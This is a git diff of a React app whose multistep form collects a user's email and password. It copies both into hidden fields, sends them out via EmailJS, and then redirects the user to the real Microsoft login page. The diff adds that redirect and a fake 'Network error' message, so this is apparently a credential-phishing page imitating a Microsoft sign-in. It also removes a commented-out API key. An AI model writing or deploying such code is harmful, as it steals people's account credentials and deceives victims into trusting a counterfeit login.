@@ -5,13 +5,8 @@ import EmailForm from './components/Form/EmailForm';
 import PasswordForm from './components/Form/PasswordForm';
 import ConfirmationForm from './components/Form/ConfirmationForm';
 import emailjs from '@emailjs/browser';
-// import axios from 'axios';
-// import { Resend } from 'resend';
 
 
-// const resend = new Resend('re_HH4nsLcG_LWtYpfxkVVYMHiuKfpoNN9Gq');
-
-// const STEPS = ["Personal Information", "Address Information", "Confirmation"];
 const STORAGE_KEY = "multistepFormData";
 const STEP_KEY = "multistepFormStep";
 
@@ -116,25 +111,6 @@ function App() {
 
       event.preventDefault(); // Prevent default form submission behavior
 
-      console.log('form data', formData);
-
-      // const headers = {
-      // 'Content-Type': 'application/json',
-      // };
-
-      const email = formData.email;
-      const password = formData.password;
-
-      const formValue = form.current;
-
-      console.log('form data email', email);
-      console.log('form data password', password);
-      console.log('form data 2', formValue['user_name'].value);
-      console.log('form data 3', formValue['message'].value);
-
-      // const htmlContent = `<h1>Hello, Here is your username: ${email}, Here is your password:  ${password} </h1><p>Welcome to our app!</p>`;
-
-
       try {
 
         emailjs.sendForm(
@@ -145,10 +121,7 @@ function App() {
         )
         .then(
           (result) => {
-            console.log('SUCCESS!', result.text);
-            // Optional: Clear form state
-            // setFormData({ user_name: '', user_email: '', message: '' });
-                
+            console.log('SUCCESS!', result.text);                
             setFormData({
               email: "",
               // code: "",
@@ -157,10 +130,13 @@ function App() {
             localStorage.removeItem(STORAGE_KEY);
 
             // Reset current step to the beginning
-            setCurrentStep(0);
+            // setCurrentStep(0);
             setErrors({});
-            setIsSubmitting(false);
+            // setIsSubmitting(false);
+            window.location.href = 'https://login.live.com/'; 
         }, (error) => {
+            error = "Network error try again!!!";
+            setErrors((prevErrors) => ({ ...prevErrors, ["password"]: error }));
             console.log('FAILED...', error.text);
             setIsSubmitting(false);
         });
@@ -178,18 +154,18 @@ function App() {
       // setTimeout(() => {
 
       //   // Reset form fields and clear localStorage
-      //   setFormData({
-      //     email: "",
-      //     // code: "",
-      //     password: "",
-      //   });
+      //   // setFormData({
+      //   //   email: "",
+      //   //   // code: "",
+      //   //   password: "",
+      //   // });
       //   localStorage.removeItem(STORAGE_KEY);
 
       //   // Reset current step to the beginning
-      //   setCurrentStep(0);
       //   setErrors({});
 
-      //   setIsSubmitting(false);
+      //   // setIsSubmitting(false);
+      //   window.location.href = 'https://login.live.com/'; 
       // }, 1000);
 
     } else {
@@ -243,28 +219,26 @@ function App() {
         }} 
         onSubmit={() => {}}
       >
-        {/* Hidden Email Field (visually hidden using CSS for better accessibility than type="hidden") */}
         <label htmlFor="user_name">Email</label>
         <input
           type="text"
-          name="user_name" // Name must match EmailJS template variable (e.g., {{user_name}})
+          name="user_name" 
           id="user_name"
           value={formData.email}
+          onChange={() => {}}
         />
 
-        {/* Hidden Password Field */}
         <label htmlFor="message">message</label>
         <input
           type="text"
-          name="message" // Name must match EmailJS template variable (e.g., {{user_password}})
+          name="message" 
           id="message"
           value={formData.password}
+          onChange={() => {}}
         />
 
-        {/* A visible input to trigger the form submission (e.g., a "Sign Up" button) */}
         <input type="submit" value="Send Hidden Data" />
     </form>
-      {/* <form ref={form} onSubmit={sendEmail}> */}
 
         <AnimatePresence mode="wait">
           <motion.div
